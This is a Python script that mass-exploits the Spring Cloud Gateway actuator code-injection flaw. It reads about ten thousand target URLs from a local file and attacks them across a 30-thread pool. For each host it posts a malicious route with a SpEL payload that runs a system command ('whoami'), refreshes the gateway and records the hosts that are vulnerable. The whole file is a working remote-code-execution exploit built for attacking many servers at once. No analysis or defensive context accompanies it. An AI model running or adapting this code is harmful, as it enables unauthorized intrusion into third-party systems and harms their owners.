import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
line_break = '\n'
file_path = Path(__file__).resolve()
result_path = file_path/'result.txt'


def exp(ip_, index):
    try:

        url = ip_+'/actuator/gateway/routes/code'
        # print(url)
        payload = {
            "id": "sec",
            "filters": [{
                "name": "AddResponseHeader",
                "args": {
                    "name": "Result",
                    "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
                }
            }],
            "uri": "http://ggg.cpdd:80"
        }
        res1 = requests.post(url, json=payload,
                             headers=headers, timeout=8, verify=False)
        print(index, ip_)

        if res1.status_code != 201:
            return
        print(res1)
        res2 = requests.post(ip_+"/actuator/gateway/refresh",
                             headers=headers, timeout=8, verify=False)
        res3 = requests.get(ip_+'/actuator/gateway/routes/code',
                            headers=headers, timeout=8, verify=False)
        # print(res, len(res.text))
        # print(ip_)
        # print(get_res.text)
        with result_path.open('a+') as file:
            file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass


def exploit(ip_, index):
    try:

        exp(ip_, index)
        # print(get_res.text)
        # with open(r'result.txt', 'a+') as file:
        # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass


url = 'http://192.168.52.150:8080'
# exploit(url, 5)


threads = []
with open(r'D:\Downloads\tmp\spring_cloud.txt', 'r') as file:
    # with open(r'nfs.txt', 'r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 900
        end = start+10100

        if index >= start and index <= end:
            urls.append(line.strip(line_break))

            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 30
# print(urls)

test = 'm'


if test == 't':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test == 'm':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()
